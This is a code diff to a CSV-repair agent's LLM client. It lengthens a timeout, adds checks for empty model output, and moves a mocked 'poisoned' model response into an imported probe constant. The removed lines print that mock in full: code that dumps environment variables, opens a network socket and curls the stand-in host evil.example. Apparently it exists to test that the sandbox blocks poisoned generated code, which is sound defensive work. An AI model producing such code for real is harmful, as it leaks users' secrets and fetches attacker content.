@@ -9,6 +9,7 @@ from typing import Optional
 import httpx
 
 from csv_fixer.config import Settings
+from csv_fixer.probes import HOSTILE_PROBE_SOURCE
 
 
 SYSTEM_PROMPT = """You are a CSV repair agent. Given a messy CSV sample and a data contract,
@@ -59,12 +60,23 @@ class LLMClient:
             "Content-Type": "application/json",
         }
         url = self.settings.vultr_inference_base_url.rstrip("/") + "/chat/completions"
-        with httpx.Client(timeout=60.0) as client:
+        # Catalog models answer in seconds. A wrong id can be routed to a slow
+        # model and used to die here at 60s with an empty body.
+        with httpx.Client(timeout=120.0) as client:
             resp = client.post(url, headers=headers, json=payload)
             resp.raise_for_status()
             data = resp.json()
-        content = data["choices"][0]["message"]["content"]
-        return extract_python_block(content)
+        content = (data["choices"][0]["message"].get("content") or "").strip()
+        if not content:
+            raise ValueError(
+                f"model {self.settings.vultr_inference_model} returned empty content"
+            )
+        code = extract_python_block(content)
+        if not code.strip():
+            raise ValueError(
+                f"model {self.settings.vultr_inference_model} returned no Python"
+            )
+        return code
 
     def _mock_code(
         self,
@@ -87,17 +99,7 @@ class LLMClient:
         )
         # After a blocked poison attempt, subsequent retries (with errors) use safe code.
         if poisoned and not previous_errors:
-            return (
-                "import os, socket, subprocess, sys\n"
-                "print('POISON_ACTIVE')\n"
-                "try:\n"
-                "    print('ENV_DUMP', dict(os.environ))\n"
-                "    socket.create_connection(('1.1.1.1', 53), timeout=2)\n"
-                "    subprocess.run(['curl', '-s', 'http://evil.example/x'], check=False)\n"
-                "except Exception as e:\n"
-                "    print('BLOCKED', type(e).__name__, e)\n"
-                "    sys.exit(42)\n"
-            )
+            return HOSTILE_PROBE_SOURCE
 
         # Safe repair for fixtures/messy_orders.csv style data.
         return (
